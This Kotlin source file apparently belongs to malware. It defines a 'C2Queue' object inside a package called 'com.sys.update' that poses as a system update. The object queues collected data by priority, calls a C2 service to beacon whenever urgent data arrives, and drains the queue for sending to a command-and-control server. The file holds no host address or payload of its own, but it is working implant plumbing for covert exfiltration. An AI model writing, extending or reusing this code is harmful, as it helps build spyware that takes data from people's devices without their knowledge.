package com.sys.update

import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicBoolean

object C2Queue {
    private val normal = ConcurrentLinkedQueue<String>()
    private val urgent = ConcurrentLinkedQueue<String>()
    private val flushing = AtomicBoolean(false)

    fun enqueue(data: String) { normal.offer(data) }

    fun enqueueUrgent(data: String) {
        urgent.offer(data)
        if (flushing.compareAndSet(false, true)) {
            C2Service.requestBeacon()
            flushing.set(false)
        }
    }

    fun drain(): List<String> {
        val out = mutableListOf<String>()
        while (true) {
            urgent.poll()?.let { out.add(it); continue }
            normal.poll()?.let { out.add(it); continue }
            break
        }
        return out
    }

    fun hasPending(): Boolean = !urgent.isEmpty() || !normal.isEmpty()
}
